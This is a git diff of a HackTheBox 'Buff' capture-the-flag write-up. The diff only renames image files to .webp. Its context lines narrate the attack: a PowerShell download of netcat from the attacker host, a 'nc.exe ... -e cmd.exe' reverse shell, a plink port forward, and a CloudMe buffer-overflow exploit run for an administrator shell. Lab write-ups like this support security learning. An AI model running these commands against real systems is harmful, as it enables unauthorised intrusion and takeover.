@@ -10,7 +10,7 @@ tags: hackthebox, writeup
 This is a writeup for HackTheBox VM [Buff](https://www.hackthebox.eu/home/machines/profile/263). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
 ### Killchain
-![writeup.overview.killchain](/static/files/posts_htb_buff/killchain.png)
+![writeup.overview.killchain](/static/files/posts_htb_buff/killchain.png.webp)
 
 ### TTPs
 1\. `8080/tcp/http/Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)`: [enumerate_proto_http](https://github.com/7h3rAm/writeups#enumerate_proto_http), [exploit_gymsystem_rce](https://github.com/7h3rAm/writeups#exploit_gymsystem_rce), [exploit_cloudme_bof](https://github.com/7h3rAm/writeups#exploit_cloudme_bof)  
@@ -39,7 +39,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 2\. We find '8080/tcp' to be open and running `Apache httpd 2.4.43`. We start by looking at the webpage and find it be hosting a fitness center portal:  
 
-![writeup.enumeration.steps.2.1](/static/files/posts_htb_buff/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_htb_buff/screenshot01.png.webp)  
 
 3\. We find multiple pages from the `gobuster` scan results and upon visiting `/contacts.php` page, we find that we are interacting with the `Gym Management Software 1.0` web application:  
 ```
@@ -72,7 +72,7 @@ cat ./10.10.10.198/scans/tcp_8080_http_gobuster.txt | grep -v 403
   /upload.php (Status: 200) [Size: 107]
 ```
 
-![writeup.enumeration.steps.3.1](/static/files/posts_htb_buff/screenshot02.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_htb_buff/screenshot02.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -86,9 +86,9 @@ cat ./10.10.10.198/scans/tcp_8080_http_gobuster.txt | grep -v 403
 python 48506.py http://10.10.10.198:8080/
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_htb_buff/screenshot03.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_htb_buff/screenshot03.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_htb_buff/screenshot04.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_htb_buff/screenshot04.png.webp)  
 
 2\. To get a fully interactive shell, we use powershell to transfer netcat binary, start a local netcat listener and then catch the incoming connection:  
 ```
@@ -98,16 +98,16 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8
 C:\Users\shaun\Desktop\nc.exe 10.10.14.8 4433 -e cmd.exe
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_htb_buff/screenshot05.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_htb_buff/screenshot05.png.webp)  
 
-![writeup.exploitation.steps.2.2](/static/files/posts_htb_buff/screenshot06.png)  
+![writeup.exploitation.steps.2.2](/static/files/posts_htb_buff/screenshot06.png.webp)  
 
 3\. We use this interactive access to read the `user.txt` flag:  
 ```
 type C:\Users\shaun\Desktop\user.txt
 ```
 
-![writeup.exploitation.steps.3.1](/static/files/posts_htb_buff/screenshot07.png)  
+![writeup.exploitation.steps.3.1](/static/files/posts_htb_buff/screenshot07.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -145,23 +145,23 @@ shaun
 netstat -anp tcp
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_htb_buff/screenshot08.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_htb_buff/screenshot08.png.webp)  
 
 2\. We find this to be a `CloudMe` process and there's a binary named `CloudMe_1112.exe` within the `C:\Users\shaun\Downloads` directory that hints that the version could be `1.11.2`:  
 ```
 powershell ps
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_htb_buff/screenshot09.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_htb_buff/screenshot09.png.webp)  
 
-![writeup.privesc.steps.2.2](/static/files/posts_htb_buff/screenshot10.png)  
+![writeup.privesc.steps.2.2](/static/files/posts_htb_buff/screenshot10.png.webp)  
 
 3\. We find a buffer overflow exploit for this application that could give us elevated privileges if the `CloudMe` process is running as Administrator:  
 ```
 searchsploit cloudme
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_htb_buff/screenshot11.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_htb_buff/screenshot11.png.webp)  
 
 4\. But we cannot connect to this service from our attacking machine. We will need to setup a port forward for this exploit to work. We start the SSH service on our attacking machine, transfer the `plink.exe` binary and setup the port forward:  
 ```
@@ -171,9 +171,9 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8
 C:\Users\shaun\Desktop\plink.exe -v -x -a -T -C -noagent -ssh -pw "kali" -R 8888:127.0.0.1:8888 kali@10.10.14.8
 ```
 
-![writeup.privesc.steps.4.1](/static/files/posts_htb_buff/screenshot12.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_htb_buff/screenshot12.png.webp)  
 
-![writeup.privesc.steps.4.2](/static/files/posts_htb_buff/screenshot13.png)  
+![writeup.privesc.steps.4.2](/static/files/posts_htb_buff/screenshot13.png.webp)  
 
 5\. We update the exploit with the right shellcode, setup a reverse shell to catch incoming connection and run the exploit:  
 ```
@@ -183,14 +183,14 @@ sudo nc -nlvp 443
 python 48389.py
 ```
 
-![writeup.privesc.steps.5.1](/static/files/posts_htb_buff/screenshot14.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_htb_buff/screenshot14.png.webp)  
 
 6\. We immmediately get an elevated reverse shell connection and use it to read the `root.txt` flag:  
 ```
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![writeup.privesc.steps.6.1](/static/files/posts_htb_buff/screenshot15.png)  
+![writeup.privesc.steps.6.1](/static/files/posts_htb_buff/screenshot15.png.webp)  
 
 ## References
 * <https://www.hackthebox.eu/home/machines/profile/263>  
